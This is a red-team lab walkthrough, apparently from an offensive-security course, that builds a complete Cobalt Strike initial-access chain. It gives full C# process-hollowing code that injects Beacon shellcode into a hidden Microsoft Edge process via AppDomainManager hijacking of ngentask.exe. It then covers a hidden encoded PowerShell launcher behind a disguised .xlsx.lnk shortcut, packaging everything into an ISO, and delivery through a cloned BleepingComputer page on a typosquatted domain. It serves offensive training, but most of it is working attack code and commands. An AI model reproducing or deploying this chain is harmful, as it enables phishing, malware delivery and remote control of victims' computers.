# Initial Access Lab  

The objective for Initial Access Lab is to create an initial access package that will spawn and inject Beacon shellcode into Microsoft Edge on the victim computer.

===

# Payload

1. Launch Cobalt Strike and connect to the team server.
2. Generate Beacon shellcode.
    1. Go to **Payloads > Windows Stageless Payload**.
    2. Listener: **http**
    3. Output: **Raw**
    4. Click **Generate**.
    5. Save to *C:\Payloads\http_x64.xprocess.bin*.


<img src="/images/initial-access-lab-01.png" width=800>  

1. Open a Terminal window and create a new directory to hold the dependencies for the infection chain.
  1. `mkdir C:\Payloads\deals`

1. Open Visual Studio and create a new Class Library (.NET Framework) project.

	> [!ALERT] Make sure it specifically says `.NET Framework`, otherwise it won't work.

    1. Use `AppDomainHijack` as the project name.
    2. Check the *place solution and project in the same directory* box.

<img src="/images/initial-access-lab-02.png" width=800>  

3. Add the shellcode to the project.
    1. Right-click the project in the Solution Explorer and select **Add > Existing Item**.
    2. Browse to *C:\Payloads*.
    3. Change the file filter to *All Files*.
    4. Select *http_x64.xprocess.bin* and click **Add**.
    5. Right-click the shellcode file in the Solution Explorer and select **Properties**.
    6. Set its *Build Action* to **Embedded Resource**.

<img src="/images/initial-access-lab-03.png" width=800>  

4. Copy the following code into Class1.cs:

    ```csharp-linenums
    using System;
    using System.IO;
    using System.Reflection;
    using System.Runtime.InteropServices;
      
    namespace AppDomainHijack
    {
        public sealed class DomainManager : AppDomainManager
        {
            public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
            {
                var si = new STARTUPINFOA
                {
                    cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
                    dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
                };
      
                // create hidden + suspended msedge process
                var success = CreateProcessA(
                    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                    "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                    IntPtr.Zero,
                    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\",
                    ref si,
                    out var pi);
      
                if (!success)
                    return;
      
                // get basic process information
                var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
                var lpPbi = Marshal.AllocHGlobal(szPbi);
      
                NtQueryInformationProcess(
                    pi.hProcess,
                    PROCESSINFOCLASS.ProcessBasicInformation,
                    lpPbi,
                    (uint)szPbi,
                    out _);
      
                // marshal data to structure
                var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
                Marshal.FreeHGlobal(lpPbi);
      
                // calculate pointer to image base address
                var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
      
                // buffer to hold data, 64-bit addresses are 8 bytes
                var bImageBaseAddress = new byte[8];
      
                // read data from spawned process
                ReadProcessMemory(
                    pi.hProcess,
                    lpImageBaseAddress,
                    bImageBaseAddress,
                    8,
                    out _);
      
                // convert address bytes to pointer
                var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
      
                // read pe headers
                var data = new byte[512];
      
                ReadProcessMemory(
                    pi.hProcess,
                    baseAddress,
                    data,
                    512,
                    out _);
      
                // read e_lfanew
                var e_lfanew = BitConverter.ToInt32(data, 0x3C);
      
                // calculate rva
                var rvaOffset = e_lfanew + 0x28;
                var rva = BitConverter.ToUInt32(data, rvaOffset);
      
                // calculate address of entry point
                var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
      
                // read the shellcode
                byte[ ] shellcode;
      
                var assembly = Assembly.GetExecutingAssembly();
      
                using (var rs = assembly.GetManifestResourceStream("AppDomainHijack.http_x64.xprocess.bin"))
                {
                    // convert stream to raw byte[ ]
                    using (var ms = new MemoryStream())
                    {
                        rs.CopyTo(ms);
                        shellcode = ms.ToArray();
                    }
                }
      
                // copy shellcode into address of entry point
                WriteProcessMemory(
                    pi.hProcess,
                    lpEntryPoint,
                    shellcode,
                    shellcode.Length,
                    out _);
      
                // resume process
                ResumeThread(pi.hThread);
            }
      
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern bool CreateProcessA(
                string applicationName,
                string commandLine,
                IntPtr processAttributes,
                IntPtr threadAttributes,
                bool inheritHandles,
                PROCESS_CREATION_FLAGS creationFlags,
                IntPtr environment,
                string currentDirectory,
                ref STARTUPINFOA startupInfo,
                out PROCESS_INFORMATION processInformation);
      
            [DllImport("ntdll.dll", ExactSpelling = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern uint NtQueryInformationProcess(
                IntPtr processHandle,
                PROCESSINFOCLASS processInformationClass,
                IntPtr processInformation,
                uint processInformationLength,
                out uint returnLength);
      
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern bool ReadProcessMemory(
                IntPtr processHandle,
                IntPtr baseAddress,
                byte[ ] buffer,
                UInt64 size,
                out uint numberOfBytesRead);
      
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern bool WriteProcessMemory(
                IntPtr processHandle,
                IntPtr baseAddress,
                byte[ ] buffer,
                int size,
                out int numberOfBytesWritten);
      
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern uint ResumeThread(IntPtr threadHandle);
        }
      
        [Flags]
        public enum PROCESS_CREATION_FLAGS : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_SECURE_PROCESS = 0x00400000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
        }
      
        public struct STARTUPINFOA
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public STARTUPINFO_FLAGS dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
      
        [Flags]
        public enum STARTUPINFO_FLAGS : uint
        {
            STARTF_FORCEONFEEDBACK = 0x00000040,
            STARTF_FORCEOFFFEEDBACK = 0x00000080,
            STARTF_PREVENTPINNING = 0x00002000,
            STARTF_RUNFULLSCREEN = 0x00000020,
            STARTF_TITLEISAPPID = 0x00001000,
            STARTF_TITLEISLINKNAME = 0x00000800,
            STARTF_UNTRUSTEDSOURCE = 0x00008000,
            STARTF_USECOUNTCHARS = 0x00000008,
            STARTF_USEFILLATTRIBUTE = 0x00000010,
            STARTF_USEHOTKEY = 0x00000200,
            STARTF_USEPOSITION = 0x00000004,
            STARTF_USESHOWWINDOW = 0x00000001,
            STARTF_USESIZE = 0x00000002,
            STARTF_USESTDHANDLES = 0x00000100
        }
      
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
      
        public enum PROCESSINFOCLASS
        {
            ProcessBasicInformation = 0
        }
      
        public struct PROCESS_BASIC_INFORMATION
        {
            public uint ExitStatus;
            public IntPtr PebBaseAddress;
            public ulong AffinityMask;
            public int BasePriority;
            public ulong UniqueProcessId;
            public ulong InheritedFromUniqueProcessId;
        }
    }
    ```

    > [+HINT] Process Hollowing
    > 
    > This is the process hollowing code from the ***Malware Essentials chapter***.

1. Build the project in Release mode.

	The DLL should be written to the following path: *C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll*.

    > [!ALERT] If your path contains something like *net8.0*, then you chose the wrong project type on step 2.

1. Go ahead and copy the DLL to the deals payload directory.

	```Terminal-nocolor
	cp C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll C:\Payloads\deals\
	```

===

## NGenTask

1. Copy the SxS version of ngentask.exe into the deals payload directory.

	```Terminal-nocolor
    cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Payloads\deals\
    ```

### Sanity test

1. Launch Cobalt Strike and connect to the team server.
1. Move into the deals payload directory and set the AppDomain environment variables:

	```PowerShell-linenums
    cd C:\Payloads\deals
    $env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
    $env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
    ```

<img src="/images/initial-access-lab-04.png" width=800>  

1. Run +++.\ngentask.exe+++

	> [!HINT] A new Beacon should appear, running in msedge.exe.

===

# Decoy

Next, create a decoy file.

1. Open Excel and create a new blank workbook.

    > [!HINT] If you cannot create a workbook, close Excel, launch Terminal as a local admin, and run the following command: +++& 'C:\Program Files\Microsoft Office\Office16\OSPPREARM.EXE'+++

3. Add some dummy deals data.

    ```xlsx-nocolor
    id  product      discount  code
    1   Prodder      56%       54473-150
    2   Viva         9%        0378-5713
    3   Aerified     22%       43742-0187
    4   Zaam-Dox     26%       35356-687
    5   Rank         41%       63323-300
    6   Pannier      61%       50804-302
    7   Wrapsafe     32%       67046-223
    8   Voltsillam   58%       55910-721
    9   Ventosanzap  4%        0485-0051
    10  Otcom        54%       36987-2281
    ```

1. Save the workbook as *C:\Payloads\deals\deals.xlsx*.
2. Close Excel.

<img src="/images/initial-access-lab-05.png" width=800>  

===

# Trigger

Now for the trigger. The user will run this which will subsequently launch the decoy and payload at the same time.

1. Generate a PowerShell one-liner that will set the required environment variables and execute ngentask.exe.

    ```PowerShell-linenums
    cd C:\Payloads\deals\
    $cmd = '$env:APPDOMAIN_MANAGER_TYPE = "AppDomainHijack.DomainManager"; $env:APPDOMAIN_MANAGER_ASM = "AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"; .\ngentask.exe'
    $enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
    ```

1. In the same window, create the shortcut that will execute the above one-liner and open the decoy.

    ```PowerShell-linenums
    $wsh = New-Object -ComObject WScript.Shell
    $lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
    $lnk.TargetPath = "%COMSPEC%"
    $lnk.Arguments = "/C start deals.xlsx && %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -enc $enc"
    $lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
    $lnk.Save()
    ```

## Validate and sanity test

1. Open Explorer and navigate to *C:\Payloads\deals*.
2. Double-click on *deals.xlsx.lnk*.

	> [!HINT] The spreadsheet will open and a new Beacon should appear at the same time.

<img src="/images/initial-access-lab-06.png" width=1024>  

===

# Container

It's time to package all of our files.  We want to hide everything, except the lnk trigger.

1. Open Ubuntu (WSL) in Terminal, and use PackMyPayload to package all the files into an ISO.

    ```ubuntu-nocolor
    python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,ngentask.exe,AppDomainHijack.dll /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso
    ```

## Final Validation sanity Check

1. Double-click on the ISO to mount it and you should only see the trigger.
2. Double-click on the trigger a final time, and the decoy and Beacon should appear.

<img src="/images/initial-access-lab-07.png" width=1024>  

===

# Delivery

We're finally ready to deliver the payload to the victim simulating social engineering, phishing, vishing, or other trickery.

1. Host the ISO on Cobalt Strike's built-in web server.
  1. Go to **Site Management > Host File**.
  2. File: +++C:\Payloads\deals\deals.iso+++
  3. Local URI: +++/deals.iso+++
  4. Local Host: +++www.bleepincomputer.com+++
  5. Click **Launch**.

1. Clone a legitimate web page.
  1. **Go to Site Management > Clone Site** 
  1. Clone URL: +++https://deals.bleepingcomputer.com+++
  2. Local URI: +++/deals+++
  3. Local Host: +++www.bleepincomputer.com+++
  4. Attack: Click the **...** button and select the hosted ISO.
  5. Click **Clone**.

<img src="/images/initial-access-lab-08.png" width=1024>  

1. Switch over to @lab.VirtualMachine(lon-wkstn-1).SelectLink and login with +++@lab.VirtualMachine(lon-wkstn-1).Password+++.

1. Open Microsoft Edge and browse to +++http://www.bleepincomputer.com/deals+++
1. Click *Open file* when deals.iso downloads.
1. Double-click on *deals.xlsx* and the decoy will open.
1. Switch back to @lab.VirtualMachine(attacker-desktop).SelectLink and a Beacon should be checking in from msedge.exe, as the user pchilds.

<br />

> [!KNOWLEDGE] In this lab you have created an initial access infection chain, leveraging DLL sideloading with ngentask.exe.
